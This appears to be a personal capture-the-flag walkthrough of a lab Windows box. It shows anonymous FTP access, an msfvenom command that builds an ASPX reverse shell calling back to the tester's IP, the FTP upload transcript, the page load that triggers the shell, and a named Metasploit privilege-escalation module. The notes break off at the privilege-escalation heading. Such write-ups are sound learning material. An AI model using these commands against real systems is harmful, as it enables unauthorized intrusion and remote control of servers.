I had already ran enum on this. Not much.
Just an FTP server and a web Server.

ftp allows **anonymous login** with 
user: `ftp`
pass: `ftp`

Maybe I can upload a reverse php shell? - PHP was mentioned as I was researching exploits for **IIS 7.5** which came up in the nmap scan.

Creating an **aspx** reverse shell with msfvenom
https://book.hacktricks.xyz/shells/shells/msfvenom
```bash
$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=8888 -f aspx > reverse_shell10-10-16-2-8888.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2872 bytes

```

Successfully uploaded
```bash
$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:nate): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put reverse_shell10-10-16-2-8888.aspx
local: reverse_shell10-10-16-2-8888.aspx remote: reverse_shell10-10-16-2-8888.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2909 bytes sent in 0.00 secs (38.5311 MB/s)
ftp> 

```

### Fire up reverse listener
using **multi/handler** with the **windows/shell/reverse_tcp** payload.

### Initiate the reverse shell
Navigate to http://10.10.10.5/reverse_shell10-10-16-2-8888.aspx in the browser.

Now have a shell as user: `inetsrv`
![[0db17cb4200340a7a296c5c8332812ea.png]]

# Internal Enumeration

```
c:\windows\system32\inetsrv>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
The command completed with one or more errors.
```

Cant access user folders.
Already did exploit suggester.

# PrivEsc


### Need to get more privs
windows/local/ms13_005_hwnd_broadcast